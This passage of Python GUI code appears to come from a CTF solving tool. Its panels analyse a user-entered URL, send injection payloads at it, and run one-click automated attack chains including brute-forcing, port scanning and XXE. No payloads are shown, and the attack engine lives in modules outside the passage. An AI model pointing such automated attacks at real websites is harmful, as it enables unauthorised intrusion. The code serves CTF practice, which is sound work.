        _append(self.detail_output, "desc: " + meta['description'] + "\n")

        _append(self.detail_output, "usage: " + meta['usage'] + "\n")

        _append(self.detail_output, "input: " + meta['input_type'] + " -> output: " + meta['output_type'] + "\n")

        if meta["deps"]:

            from .scripts.deps import check_dep

            _append(self.detail_output, "\ndep status:\n")

            all_ok = True

            for d in meta["deps"]:

                ok = check_dep(d)

                icon = "  ok" if ok else "  MISS"

                _append(self.detail_output, icon + " " + d + "\n")

                if not ok:

                    all_ok = False

            if all_ok:

                self.install_btn.pack_forget()

            else:

                self.install_btn.pack(side=tk.LEFT, padx=(0, 8))

        else:

            _append(self.detail_output, "\nzero deps\n")

            self.install_btn.pack_forget()



    def _run_selected(self):

        if not self._current_key:

            _clear_output(self.detail_output)

            _append(self.detail_output, "select a script first")

            return

        try:

            from .scripts.runner import run_script as _run

            meta = None

            for k, m in self._all_scripts:

                if k == self._current_key:

                    meta = m

                    break

            _clear_output(self.detail_output)

            title = meta['title'] if meta else self._current_key

            _append(self.detail_output, "running: " + title + "\n")

            _append(self.detail_output, "=" * 50 + "\n\n")

            result = _run(self._current_key)

            if result["stdout"]:

                _append(self.detail_output, result["stdout"])

            if result["stderr"]:

                _append(self.detail_output, "\nerr:\n" + result['stderr'])

            if result["success"]:

                _append(self.detail_output, "\n" + "=" * 50 + "\nOK")

            else:

                _append(self.detail_output, "\n" + "=" * 50 + "\nFAIL code=" + str(result['exit_code']))

        except Exception as e:

            _clear_output(self.detail_output)

            _append(self.detail_output, "error: " + str(e))



    def _check_deps(self):

        _clear_output(self.detail_output)

        _append(self.detail_output, "checking deps...\n")

        _append(self.detail_output, "=" * 50 + "\n\n")

        try:

            from .scripts.deps import check_all_deps

            status = check_all_deps()

            if not status:

                _append(self.detail_output, "all zero-dependency\n")

                self.dep_status_label.configure(text="all zero-deps", fg=GREEN)

                return

            total = 0

            missing = 0

            for key, info in status.items():

                ok = "OK" if info["all_ok"] else "MISS"

                _append(self.detail_output, ok + " " + info['meta']['title'] + "\n")

                total += 1

                for d in info["deps"]:

                    icon = "    ok" if d["installed"] else "    MISS"

                    _append(self.detail_output, icon + " " + d['name'] + "\n")

                if not info["all_ok"]:

                    missing += 1

                _append(self.detail_output, "\n")

            if missing == 0:

                _append(self.detail_output, "\nall " + str(total) + " OK")

                self.dep_status_label.configure(text="all " + str(total) + " OK", fg=GREEN)

            else:

                _append(self.detail_output, "\n" + str(missing) + "/" + str(total) + " MISS")

                self.dep_status_label.configure(text=str(missing) + "/" + str(total) + " MISS", fg=YELLOW)

        except Exception as e:

            _append(self.detail_output, "check failed: " + str(e))



    def _install_all_deps(self):

        _clear_output(self.detail_output)

        _append(self.detail_output, "installing missing deps...\n")

        _append(self.detail_output, "=" * 50 + "\n\n")

        import threading

        def run():

            try:

                from .scripts.deps import get_missing_deps, install_all_missing

                missing = get_missing_deps()

                if not missing:

                    _append(self.detail_output, "all installed\n")

                    self.dep_status_label.configure(text="all installed", fg=GREEN)

                    return

                pkgs = ", ".join(sorted(missing))

                _append(self.detail_output, "installing " + str(len(missing)) + ": " + pkgs + "\n\n")

                _append(self.detail_output, "please wait... pip is running\n")

                results = install_all_missing()

                ok_count = 0

                for r in results:

                    icon = "OK" if r["success"] else "FAIL"

                    msg = r['message']

                    if isinstance(msg, bytes):

                        msg = msg.decode('utf-8', errors='replace')

                    _append(self.detail_output, icon + " " + r['dep'] + ": " + msg + "\n")

                    if r["success"]:

                        ok_count += 1

                _append(self.detail_output, "\n" + "=" * 50 + "\n")

                if ok_count == len(results):

                    _append(self.detail_output, "all " + str(ok_count) + " installed")

                    self.dep_status_label.configure(text="all installed", fg=GREEN)

                else:

                    _append(self.detail_output, str(ok_count) + "/" + str(len(results)) + " OK")

                self._populate_list()

            except Exception as e:

                _append(self.detail_output, "install failed: " + str(e))

        t = threading.Thread(target=run, daemon=True)

        t.start()



    def _install_script_deps(self):

        if not self._current_key:

            return

        try:

            from .scripts.deps import install_deps_for_script

            from .scripts.registry import get_script

            meta = get_script(self._current_key)

            if not meta or not meta["deps"]:

                return

            _clear_output(self.detail_output)

            _append(self.detail_output, "installing '" + meta['title'] + "' deps: " + ", ".join(meta['deps']) + "\n")

            _append(self.detail_output, "=" * 50 + "\n\n")

            _append(self.detail_output, "please wait... pip is running\n")

        except Exception as e:

            _append(self.detail_output, "prep error: " + str(e))

            return

        import threading

        def run():

            try:

                from .scripts.deps import install_deps_for_script

                results = install_deps_for_script(self._current_key)

                ok_count = 0

                for r in results:

                    icon = "OK" if r["success"] else "FAIL"

                    msg = r['message']

                    if isinstance(msg, bytes):

                        msg = msg.decode('utf-8', errors='replace')

                    _append(self.detail_output, icon + " " + r['dep'] + ": " + msg + "\n")

                    if r["success"]:

                        ok_count += 1

                _append(self.detail_output, "\n" + "=" * 50 + "\n")

                if ok_count == len(results):

                    _append(self.detail_output, "done, ready to run")

                sel = self.script_list.curselection()

                if sel:

                    self._on_select(None)

                self._populate_list()

            except Exception as e:

                _append(self.detail_output, "install failed: " + str(e))

        t = threading.Thread(target=run, daemon=True)

        t.start()



    def _solve_url(self):

        url = self.url_entry.get().strip()

        if not url or url == "http://":

            _clear_output(self.detail_output)

            _append(self.detail_output, "Enter a target URL and click Solve\n")

            return

        self.solve_btn.configure(text="Running...", state="disabled", bg=RED)

        _clear_output(self.detail_output)

        _append(self.detail_output, "Target: " + url + "\n")

        _append(self.detail_output, "=" * 50 + "\n\n")

        import threading

        def run():

            try:

                from .scripts.solver import solve_web

                def progress(step, status, detail):

                    if status == "flag!":

                        _append(self.detail_output, "\nFLAG: " + detail + "\n")

                    elif status == "running":

                        _append(self.detail_output, step + " " + detail + "\n")

                    else:

                        s = "> " if status == "ok" else "x "

                        _append(self.detail_output, s + step + ": " + detail + "\n")

                result = solve_web(url, progress_callback=progress)

                _append(self.detail_output, "\n" + "=" * 50 + "\n")

                if result["flag"]:

                    _append(self.detail_output, "FLAG: " + result["flag"] + "\n")

                else:

                    _append(self.detail_output, "No flag found - try other tabs or manual scripts\n")

            except Exception as e:

                _append(self.detail_output, "Error: " + str(e) + "\n")

            self.solve_btn.configure(text="Solve", state="normal", bg=ACCENT)

        t = threading.Thread(target=run, daemon=True)

        t.start()



def _pretty_json(obj):

    import json

    return json.dumps(obj, indent=2, ensure_ascii=False)





# ═══════════════════════════════════════════════════════════

#  CTF 知识文档面板

# ═══════════════════════════════════════════════════════════


class DocsPanel(tk.Frame):
    """CTF 解题指南：分类速查 + 邪修心法."""

    _DOCS_ROOT = os.path.join(os.path.dirname(os.path.dirname(__file__)),
                               "docs", "ctf-guide")

    _DOCS = [
        ("📋 索引导航", "README.md", ""),
        ("🏴‍☠️ 邪修速查", "CTF-CheatSheet.md", ""),
        ("", "", ""),  # separator
        ("🔵 Web 安全", "ctf-web.md", "源码泄露·文件包含·SQL注入·SSTI·SSRF·JWT·反序列化"),
        ("🟡 密码学", "ctf-crypto.md", "RSA攻击·AES模式·ECC·Lattice·古典密码·编码识别"),
        ("🔴 逆向工程", "ctf-reverse.md", "IDA·angr·Z3·脱壳·APK·反调试"),
        ("🟣 Pwn", "ctf-pwn.md", "栈溢出·ROP·堆利用·格式化字符串·ret2libc"),
        ("🟠 取证隐写", "ctf-forensics.md", "LSB·频谱图·Wireshark·Volatility·文件修复"),
        ("🟢 Misc", "ctf-misc.md", "PyJail·条件竞争·网络协议隐写·编码解码"),
        ("⚫ OSINT", "ctf-osint.md", "Google Dorks·图片反查·Maltego·地理位置"),
        ("🔴 恶意软件", "ctf-malware.md", "LOLBAS·Cobalt Strike·DLL劫持·无文件"),
        ("🤖 AI/ML", "ctf-aiml.md", "模型逆向·对抗样本·LangChain·GGUF"),
    ]

    def __init__(self, parent):
        super().__init__(parent, bg=BG)
        self._content_cache = {}

        # ── 标题 ──
        _label(self, "📚 CTF 解题指南  ·  九大方向 + 邪修速查",
               fg=ACCENT, font_size=16, bold=True, pady=8)

        # ── 左右分割面板 ──
        panes = tk.PanedWindow(self, orient=tk.HORIZONTAL,
                               bg=BORDER, sashwidth=3)
        panes.pack(fill=tk.BOTH, expand=True, padx=8, pady=(0, 8))

        # ── 左侧 — 文档列表 ──
        list_frame = tk.Frame(panes, bg=DARK)
        panes.add(list_frame, width=200)

        tk.Label(list_frame, text="文档列表", bg=DARK, fg=FG,
                 font=("Microsoft YaHei UI", 10, "bold")).pack(
                     anchor="w", padx=10, pady=(8, 4))

        # 可滚动的按钮列表
        list_canvas = tk.Canvas(list_frame, bg=DARK, highlightthickness=0)
        list_sb = tk.Scrollbar(list_frame, orient="vertical",
                               command=list_canvas.yview)
        self._list_inner = tk.Frame(list_canvas, bg=DARK)
        self._list_inner.bind("<Configure>",
            lambda e: list_canvas.configure(
                scrollregion=list_canvas.bbox("all")))
        list_canvas.create_window((0, 0), window=self._list_inner,
                                   anchor="nw", width=190)
        list_canvas.configure(yscrollcommand=list_sb.set)
        list_canvas.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        list_sb.pack(side=tk.RIGHT, fill=tk.Y)

        def _mw_list(event):
            list_canvas.yview_scroll(int(-event.delta / 120), "units")
        list_canvas.bind("<Enter>", lambda e: list_canvas.bind_all(
            "<MouseWheel>", _mw_list))
        list_canvas.bind("<Leave>", lambda e: list_canvas.unbind_all(
            "<MouseWheel>"))

        self._doc_buttons = []
        for name, filename, desc in self._DOCS:
            if not name:
                # 分隔线
                tk.Frame(self._list_inner, bg=BORDER,
                         height=1).pack(fill=tk.X, padx=8, pady=8)
                continue
            btn = tk.Button(self._list_inner, text=name,
                            bg=DARK, fg=FG, anchor="w", relief="flat",
                            font=("Microsoft YaHei UI", 10),
                            padx=12, pady=5, cursor="hand2",
                            activebackground=INPUT_BG, activeforeground=ACCENT)
            btn.pack(fill=tk.X, padx=4, pady=1)
            btn.bind("<Button-1>", lambda e, fn=filename: self._load_doc(fn))
            btn.bind("<Enter>", lambda e, b=btn: b.configure(
                bg=INPUT_BG, fg=ACCENT))
            btn.bind("<Leave>", lambda e, b=btn: b.configure(
                bg=DARK, fg=FG))
            self._doc_buttons.append(btn)

        # ── 右侧 — 文档内容 ──
        detail_frame = tk.Frame(panes, bg=BG)
        panes.add(detail_frame, width=650)

        # 当前文档标题
        self._doc_title = tk.Label(detail_frame, text="",
                                   bg=BG, fg=ACCENT,
                                   font=("Microsoft YaHei UI", 13, "bold"))
        self._doc_title.pack(anchor="w", padx=12, pady=(6, 2))

        # 可滚动的文本区
        detail_bg = "#1e1e2e"
        self._doc_area = scrolledtext.ScrolledText(
            detail_frame, wrap=tk.WORD, bg=detail_bg,
            fg=FG, insertbackground=ACCENT,
            font=("Cascadia Code", 10),
            relief="flat", bd=0,
            selectbackground=ACCENT, selectforeground=DARK,
            padx=14, pady=10)
        self._doc_area.pack(fill=tk.BOTH, expand=True)
        self._doc_area.configure(state=tk.DISABLED)

        # 右侧鼠标滚轮
        def _mw_right(event):
            self._doc_area.yview_scroll(int(-event.delta / 120), "units")
        self._doc_area.bind("<Enter>", lambda e: self._doc_area.bind_all(
            "<MouseWheel>", _mw_right))
        self._doc_area.bind("<Leave>", lambda e: self._doc_area.unbind_all(
            "<MouseWheel>"))

        # 默认加载速查表
        self.after(200, lambda: self._load_doc("CTF-CheatSheet.md"))

    def _load_doc(self, filename):
        """加载并显示文档内容."""
        if filename in self._content_cache:
            content = self._content_cache[filename]
        else:
            path = os.path.join(self._DOCS_ROOT, filename)
            try:
                with open(path, "r", encoding="utf-8") as f:
                    content = f.read()
                self._content_cache[filename] = content
            except FileNotFoundError:
                content = f"# 文件未找到\n\n{path}"

        self._doc_area.configure(state=tk.NORMAL)
        self._doc_area.delete("1.0", tk.END)
        self._doc_area.insert("1.0", content)

        # 标题
        for name, fn, desc in self._DOCS:
            if fn == filename:
                self._doc_title.configure(text=f"📖 {name}")
                break
        else:
            self._doc_title.configure(text=f"📖 {filename}")

        self._doc_area.configure(state=tk.DISABLED)

        # 高亮当前按钮
        for btn in self._doc_buttons:
            btn.configure(bg=DARK, fg=FG)


# ═══════════════════════════════════════════════════════════

#  主窗口

# ═══════════════════════════════════════════════════════════



class UrlAttackPanel(tk.Frame):
    """智能攻击面板：粘贴URL→自动分析→一键解题+读Flag."""

    def __init__(self, parent):
        super().__init__(parent, bg=BG)
        self._last_analyze_result = None

        # ── 标题 ──
        _label(self, "★ v10 ★ 粘贴URL→分析→🚀一键解题", fg=ACCENT, font_size=16, bold=True, pady=8)

        # ── URL输入行 ──
        url_row = tk.Frame(self, bg=BG)
        url_row.pack(fill=tk.X, padx=10, pady=(4, 2))
        tk.Label(url_row, text="URL:", bg=BG, fg=FG, font=("Microsoft YaHei UI", 11)).pack(side=tk.LEFT, padx=(0, 6))
        self.url_entry = tk.Entry(url_row, bg=INPUT_BG, fg=FG, insertbackground=FG,
            font=("Cascadia Code", 10), relief="flat", bd=1)
        self.url_entry.pack(side=tk.LEFT, fill=tk.X, expand=True)
        self.url_entry.bind("<Return>", lambda e: self._analyze())
        tk.Button(url_row, text="📋 Paste", command=self._paste_url,
            bg=INPUT_BG, fg=FG, font=("Microsoft YaHei UI", 9),
            padx=10, cursor="hand2", relief="flat").pack(side=tk.LEFT, padx=(6, 4))
        tk.Button(url_row, text="🔍 分析", command=self._analyze,
            bg=ACCENT, fg=DARK, font=("Microsoft YaHei UI", 10, "bold"),
            padx=16, pady=4, cursor="hand2", relief="flat").pack(side=tk.LEFT)

        # ── 状态栏 ──
        self.status_label = tk.Label(self, text="💡 粘贴CTF题目URL，点「分析」或按Enter",
            bg=BG, fg=BORDER, font=("Microsoft YaHei UI", 9))
        self.status_label.pack(anchor="w", padx=12, pady=(2, 0))

        # ── 操作按钮行 (初始隐藏) ──
        self._btn_row = tk.Frame(self, bg=BG)
        self.auto_solve_btn = tk.Button(self._btn_row, text="🚀 一键解题 — 自动攻击+升级+读Flag",
            bg="#FF6600", fg="#ffffff", relief="flat", padx=18, pady=8, cursor="hand2",
            font=("Microsoft YaHei UI", 12, "bold"),
            command=self._auto_solve_clicked)
        self.auto_solve_btn.pack(side=tk.LEFT, padx=(0, 8))
        self.deep_scan_btn = tk.Button(self._btn_row, text="🔬 深度扫描 — 字典爆破+端口+攻击链升级",
            bg="#9933CC", fg="#ffffff", relief="flat", padx=14, pady=8, cursor="hand2",
            font=("Microsoft YaHei UI", 11, "bold"),
            command=self._deep_scan_clicked)
        self.deep_scan_btn.pack(side=tk.LEFT, padx=(0, 8))
        self.multi_stage_btn = tk.Button(self._btn_row, text="🔄 多阶段解题 — 弱口令→跳转→XXE→...全自动",
            bg="#009966", fg="#ffffff", relief="flat", padx=14, pady=8, cursor="hand2",
            font=("Microsoft YaHei UI", 11, "bold"),
            command=self._multi_stage_clicked)
        self.multi_stage_btn.pack(side=tk.LEFT)

        # ── Canvas结果区 ──
        canvas_outer = tk.Frame(self, bg=BG)
        canvas_outer.pack(fill=tk.BOTH, expand=True, padx=4)
        self.result_canvas = tk.Canvas(canvas_outer, bg=BG, highlightthickness=0)
        sb = tk.Scrollbar(canvas_outer, orient="vertical", command=self.result_canvas.yview)
        self.result_frame = tk.Frame(self.result_canvas, bg=BG)
        self.result_frame._canvas_win = self.result_canvas.create_window(
            (0, 0), window=self.result_frame, anchor="nw", width=800)
        self.result_frame.bind("<Configure>",
            lambda e: self.result_canvas.configure(scrollregion=self.result_canvas.bbox("all")))
        self.result_canvas.configure(yscrollcommand=sb.set)
        self.result_canvas.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        sb.pack(side=tk.RIGHT, fill=tk.Y)
        def _mw(event):
            self.result_canvas.yview_scroll(int(-event.delta / 120), "units")
        self.result_canvas.bind("<Enter>", lambda e: self.result_canvas.bind_all("<MouseWheel>", _mw))
        self.result_canvas.bind("<Leave>", lambda e: self.result_canvas.unbind_all("<MouseWheel>"))

    def _paste_url(self):
        try:
            text = self.clipboard_get()
            self.url_entry.delete(0, tk.END)
            self.url_entry.insert(0, text.strip())
            self.status_label.config(text="📋 已粘贴，点「分析」或按Enter", fg=YELLOW)
        except Exception:
            self.status_label.config(text="⚠️ 剪贴板为空", fg=RED)

    def _analyze(self):
        """分析URL."""
        url = self.url_entry.get().strip()
        if not url:
            self.status_label.config(text="⚠️ 请输入URL", fg=RED)
            return
        self.status_label.config(text="🔍 正在分析... (爬取+漏洞检测)", fg=YELLOW)
        self.url_entry.config(state="disabled")
        for w in self.result_frame.winfo_children():
            w.destroy()
        self._btn_row.pack_forget()
        self._refresh_canvas()

        import threading
        def _run():
            try:
                from .core.url_analyzer import analyze_url
                result = analyze_url(url)
                self.after(0, lambda: self._on_analyze_done(result))
            except Exception as e:
                import traceback as _tb
                self.after(0, lambda: self._on_analyze_error(str(e) + "\n" + _tb.format_exc()))
        threading.Thread(target=_run, daemon=True).start()

    def _on_analyze_done(self, result):
        self.url_entry.config(state="normal")
        results = result.get("results", [])
        error = result.get("error")
        self._last_analyze_result = result
        if error:
            self.status_label.config(text=f"❌ {error}", fg=RED)
            _label(self.result_frame, f"分析失败: {error}", fg=RED, font_size=12, pady=20)
            self._refresh_canvas()
            return
        if not results:
            self.status_label.config(text="⚠️ 未检测到明显漏洞特征", fg=YELLOW)
            _label(self.result_frame, "未检测到明显漏洞特征\n\n可能原因:\n  · 页面无参数/表单\n  · 纯静态页面\n  · 不在支持范围内\n\n👇 仍可尝试一键解题（静态扫描Flag）",
                   fg=YELLOW, font_size=11, pady=20)
            self._refresh_canvas()
        else:
            self.status_label.config(text=f"✅ 发现 {len(results)} 种漏洞特征", fg=GREEN)
            self._render_results(result)
            self._refresh_canvas()

        # Always show action buttons (v3.5 supports deep scan)
        self._btn_row.pack(pady=(4, 12))
        self._refresh_canvas()

    def _on_analyze_error(self, msg):
        self.url_entry.config(state="normal")
        self.status_label.config(text="❌ 分析异常", fg=RED)
        _label(self.result_frame, f"分析异常:\n{msg[:500]}", fg=RED, font_size=10, pady=20)
        self._refresh_canvas()

    def _render_results(self, result):
        """渲染漏洞卡片."""
        for w in self.result_frame.winfo_children():
            w.destroy()
        results = result.get("results", [])
        url = result.get("url", "")
        for r in results:
            vtype = r.get("type", "???")
            conf = r.get("confidence", 50)
            params = r.get("params", [])
            payloads = r.get("payloads", [])
            tip = r.get("tip", "")
            # 卡片外框
            fc = tk.Frame(self.result_frame, bg=INPUT_BG,
                highlightthickness=1, highlightbackground=BORDER)
            fc.pack(fill=tk.X, padx=8, pady=(4, 2), ipady=6)
            # 标题行
            hf = tk.Frame(fc, bg=INPUT_BG)
            hf.pack(fill=tk.X, padx=10, pady=(6, 2))
            conf_color = "#00FF00" if conf >= 80 else ("#FFD700" if conf >= 50 else "#FF6600")
            conf_icon = "🔴" if conf >= 80 else ("🟡" if conf >= 50 else "🟢")
            tk.Label(hf, text=f"{conf_icon} {vtype}", bg=INPUT_BG, fg=conf_color,
                font=("Microsoft YaHei UI", 13, "bold")).pack(side=tk.LEFT)
            tk.Label(hf, text=f"  置信度: {conf}%", bg=INPUT_BG, fg=BORDER,
                font=("Microsoft YaHei UI", 9)).pack(side=tk.LEFT)
            param_str = ", ".join(params[:4]) if params else "自动"
            tk.Label(hf, text=f"  参数: {param_str}", bg=INPUT_BG, fg=FG,
                font=("Cascadia Code", 9)).pack(side=tk.LEFT, padx=(12, 0))
            # 说明
            if tip:
                tk.Label(fc, text=tip[:120], bg=INPUT_BG, fg=BORDER,
                    font=("Microsoft YaHei UI", 8), wraplength=740).pack(anchor="w", padx=14, pady=(0, 4))
            # Payload按钮行
            if payloads:
                pf = tk.Frame(fc, bg=INPUT_BG)
                pf.pack(fill=tk.X, padx=10, pady=(0, 6))
                for pdef in payloads[:10]:
                    self._make_payload_row(pf, pdef, url, params)
        # 显示操作按钮
        self._btn_row.pack(fill=tk.X, padx=12, pady=(4, 2))

    def _make_payload_row(self, parent, pdef, attack_url, params):
        """创建单个Payload的测试按钮行."""
        name = pdef.get("name", "payload")
        payload = pdef.get("payload", "")
        param = params[0] if params else ""
        row = tk.Frame(parent, bg=INPUT_BG)
        row.pack(fill=tk.X, pady=(2, 1))
        # 名称
        tk.Label(row, text=f"  💉 {name}", bg=INPUT_BG, fg=FG,
            font=("Microsoft YaHei UI", 9)).pack(side=tk.LEFT)
        # 复制
        def _cp(p=payload):
            self.clipboard_clear()
            self.clipboard_append(p)
            self.status_label.config(text="📋 Payload已复制", fg=GREEN)
        tk.Button(row, text="📋", command=_cp,
            bg=INPUT_BG, fg=FG, font=("Microsoft YaHei UI", 8),
            padx=8, cursor="hand2", relief="flat", bd=1).pack(side=tk.RIGHT, padx=(2, 0))
        # 发送 (保存引用防闭包bug)
        row._attack_url = attack_url
        row._attack_param = param
        row._attack_pdef = pdef
        tk.Button(row, text="🔍 发送",
            command=lambda r=row: self._do_attack(r._attack_pdef, r._attack_url, r._attack_param),
            bg="#FF6600", fg="#ffffff", font=("Microsoft YaHei UI", 8, "bold"),
            padx=10, pady=1, cursor="hand2", relief="flat").pack(side=tk.RIGHT, padx=(2, 8))

    def _do_attack(self, pdef, url, param):
        """执行单个攻击请求 + 显示结果."""
        name = pdef.get("name", "payload")
        payload_text = pdef.get("payload", "")
        if not param:
            # 尝试从URL提取
            from urllib.parse import urlparse, parse_qs
            qs = urlparse(url).query
            if qs:
                first_key = list(parse_qs(qs).keys())[0] if parse_qs(qs) else ""
                param = first_key
        if not url:
            self.status_label.config(text="❌ 无目标URL", fg=RED)
            return
        self.status_label.config(text=f"🚀 攻击中: {name}...", fg=YELLOW)
        import threading
        def _run():
            try:
                from .core.url_analyzer import execute_attack
                rv = execute_attack(url, {"type": "", "params": [param], "payloads": [pdef]})
                attacks = rv.get("attacks", [])
                result_text = ""
                for a in attacks:
                    body = a.get("body", "")[:2000]
                    result_text += f"=== {a.get('payload_name', name)} ===\n"
                    result_text += f"HTTP {a.get('status', '?')} | {a.get('size', 0)}B | {a.get('time_ms', 0)}ms\n"
                    result_text += f"URL: {a.get('url', '')[:200]}\n"
                    result_text += body + "\n"
                self.after(0, lambda: self._show_attack_result(name, result_text))
            except Exception as e:
                self.after(0, lambda: self._show_attack_result(name, f"攻击异常: {e}"))
        threading.Thread(target=_run, daemon=True).start()

    def _show_attack_result(self, name, text):
        """在Canvas中显示单次攻击结果."""
        self.status_label.config(text=f"✅ 攻击完成: {name}", fg=GREEN)
        # 清除旧攻击结果
        kids = list(self.result_frame.winfo_children())
        for w in kids:
            if getattr(w, '_is_attack_resp', False):
                w.destroy()
        # 响应框
        rf = tk.Frame(self.result_frame, bg=INPUT_BG,
            highlightthickness=1, highlightbackground=ACCENT)
        rf._is_attack_resp = True
        rf.pack(fill=tk.X, padx=8, pady=4)
        # 标题栏
        hf = tk.Frame(rf, bg=ACCENT)
        hf.pack(fill=tk.X)
        tk.Label(hf, text=f"  📡 {name}", bg=ACCENT, fg=DARK,
            font=("Microsoft YaHei UI", 10, "bold")).pack(side=tk.LEFT, padx=8, pady=3)
        tk.Button(hf, text="⬅️ 返回漏洞列表", command=self._go_back,
            bg=DARK, fg=FG, font=("Microsoft YaHei UI", 9),
            padx=10, pady=2, cursor="hand2", relief="flat").pack(side=tk.RIGHT, padx=6, pady=2)
        # 响应正文
        tv = tk.Text(rf, bg=BG, fg=FG, font=("Cascadia Code", 8),
            height=12, wrap=tk.WORD, bd=0, padx=8, pady=6)
        tv.pack(fill=tk.BOTH, expand=True, padx=4, pady=(0, 4))
        tv.insert("1.0", text or "(empty response)")
        tv.config(state="disabled")
        # 滚动到底部
        def _scroll():
            try:
                tv.see(tk.END)
                self.result_canvas.yview_moveto(1.0)
            except Exception:
                pass
        self.after(100, _scroll)
        self._refresh_canvas()

    def _go_back(self):
        """返回漏洞列表."""
        self._gui_done = True  # Stop any running queue drain
        kids = list(self.result_frame.winfo_children())
        for w in kids:
            if getattr(w, '_is_attack_resp', False) or getattr(w, '_is_solve_ui', False):
                w.destroy()
        if self._last_analyze_result:
            self._render_results(self._last_analyze_result)
            self.status_label.config(text="✅ 已返回漏洞列表", fg=GREEN)
        else:
            self.status_label.config(text="⚠️ 无分析结果可返回", fg=RED)
        self._refresh_canvas()

    # ═══════════════════════════════════════════
    #  一键解题
    # ═══════════════════════════════════════════
    def _auto_solve_clicked(self):
        if self._last_analyze_result is None:
            self.status_label.config(text="⚠️ 请先分析URL", fg=YELLOW)
            return
        self._btn_row.pack_forget()
        self._auto_solve(self._last_analyze_result, mode="quick")

    def _deep_scan_clicked(self):
        """🔬 深度扫描按钮."""
        if self._last_analyze_result is None:
            self.status_label.config(text="⚠️ 请先分析URL", fg=YELLOW)
            return
        self._btn_row.pack_forget()
        self._auto_solve(self._last_analyze_result, mode="deep")

    def _multi_stage_clicked(self):
        """🔄 多阶段解题按钮."""
        if self._last_analyze_result is None:
            self.status_label.config(text="⚠️ 请先分析URL", fg=YELLOW)
            return
        self._btn_row.pack_forget()
        self._auto_solve(self._last_analyze_result, mode="multi")

    def _auto_solve(self, result, mode="quick"):
        """v3.5 智能解题：快速/深度/多阶段 三种模式."""
        try:
            self._auto_solve_inner(result, mode=mode)
        except Exception as e:
            import traceback
            err = str(e) + "\n" + str(traceback.format_exc())
            try:
                import time as _t2
                with open('solve_debug.log', 'a', encoding='utf-8') as _f:
                    _f.write(f"=== OUTER_CRASH {_t2.strftime('%H:%M:%S')} mode={mode} ===\n")
                    _f.write(err + '\n')
            except Exception:
                pass
            with open('solve_debug.log', 'a', encoding='utf-8') as _f:
                _f.write(f"\n=== EXCEPTION in _auto_solve ===\n{err}\n")
            err = err.replace('\x00', '').replace('\r', '')[:800]
            try:
                for w in list(self.result_frame.winfo_children()):
                    w.destroy()
            except Exception:
                pass
            try:
                _label(self.result_frame,
                    f"❌ 引擎启动失败: {err}",
                    fg=RED, font_size=11, pady=20)
            except Exception:
                tk.Label(self.result_frame, text=f"引擎失败: {e}",
                    bg=BG, fg=RED).pack(pady=20)

    def _auto_solve_inner(self, result, mode="quick"):
        """Inner implementation — wrapped by _auto_solve with error handling."""
        url = result.get("url", "")
        results = result.get("results", [])
        fingerprint = result.get("fingerprint", {})

        import time as _t
        is_deep = (mode == "deep")
        is_multi = (mode == "multi")
        if is_multi:
            mode_label = "🔄 多阶段解题"
        elif is_deep:
            mode_label = "🔬 深度扫描"
        else:
            mode_label = "🚀 快速解题"
        _log = [f"_auto_solve v3.6 {_t.time():.0f} mode={mode}", f"url={url[:80]}", f"results={len(results)}"]
        def _dlog(msg):
            _log.append(f"{msg}")

        # IMMEDIATE write to disk for diagnosis
        with open('solve_debug.log', 'w', encoding='utf-8') as _f:
            _f.write(f"ENTER _auto_solve_inner {_t.strftime('%H:%M:%S')}\nurl={url}\nresults_count={len(results)}\nfingerprint={fingerprint}\n")

        _dlog("start")

        # 清除 + 进度UI
        for w in list(self.result_frame.winfo_children()):
            w.destroy()
        _dlog("cleared children")

        # Show fingerprint info
        fp_info = ""
        if fingerprint:
            cms = fingerprint.get('cms', '')
            waf = fingerprint.get('waf', '')
            php_vulns = fingerprint.get('php_vulns', [])
            php_params = fingerprint.get('php_params', [])
            if cms and cms != 'Unknown':
                fp_info += f"CMS: {cms} | "
            if waf:
                fp_info += f"WAF: {waf} | "
            if php_vulns:
                top = php_vulns[0]
                fp_info += f"源码: {top['reason']} ({top['confidence']}%)"
            if php_params:
                methods = set(p['method'] for p in php_params)
                fp_info += f" | 方法: {','.join(methods)}"

        _label(self.result_frame,
            f"{mode_label} v3.6\n\n目标: {url[:80]}\n{fp_info}\n" +
            (f"🔄 多阶段: 弱口令爆破→JS跳转→页面识别→对应攻击" if is_multi else
             f"🗂 字典扫描 + 并发攻击 + 攻击链升级" if is_deep else
             f"{len(results)} 种漏洞 → 并发攻击"),
            fg=ACCENT, font_size=11, pady=(8, 4))
        self._solve_status = tk.Label(self.result_frame, text="⏳ 构建攻击计划...",
            bg=BG, fg=YELLOW, font=("Microsoft YaHei UI", 11, "bold"))
        self._solve_status.pack(pady=(4, 4))
        self._solve_progress = tk.Text(self.result_frame, bg=INPUT_BG, fg=FG,
            font=("Cascadia Code", 9), height=6, wrap=tk.WORD, bd=0, padx=10, pady=6)
        self._solve_progress.pack(fill=tk.X, padx=6, pady=(0, 4))
        self._solve_progress.insert(tk.END, "⏳ 指纹识别完成，构建攻击计划...\n")
        # 进度条
        bar_frame = tk.Frame(self.result_frame, bg=BG)
        bar_frame.pack(fill=tk.X, padx=10, pady=(0, 4))
        self._solve_bar_label = tk.Label(bar_frame, text="准备中...", bg=BG, fg=BORDER,
            font=("Microsoft YaHei UI", 9))
        self._solve_bar_label.pack(anchor="w")
        self._solve_bar = ttk.Progressbar(bar_frame, mode='determinate', length=740, maximum=100)
        self._solve_bar.pack(fill=tk.X)
        self._solve_bar['value'] = 0
        self._cancel_flag = False
        self._stop_btn = tk.Button(self.result_frame, text="⏹ 停止",
            command=self._cancel_attack,
            bg="#553333", fg="#ffffff", font=("Microsoft YaHei UI", 9),
            padx=10, pady=2, cursor="hand2", relief="flat")
        self._stop_btn.pack(pady=(0, 6))
        self._refresh_canvas()
        _dlog("progress UI created")

        # ⚠️ tkinter is NOT thread-safe. All callbacks from worker threads
        # MUST use self.after() to marshal to the main thread.
        import queue
        self._gui_queue = queue.Queue()
        self._gui_done = False

        def _process_queue():
            """Drain the thread-safe GUI update queue."""
            try:
                while True:
                    msg = self._gui_queue.get_nowait()
                    if msg[0] == 'progress':
                        _, stage, item, status = msg
                        try:
                            if hasattr(self, '_solve_progress') and self._solve_progress.winfo_exists():
                                self._solve_progress.insert(tk.END, f"[{stage}] {str(item)[:35]}: {str(status)[:70]}\n")
                                self._solve_progress.see(tk.END)
                        except Exception:
                            pass
                    elif msg[0] == 'progress_bar':
                        _, pct, label = msg
                        try:
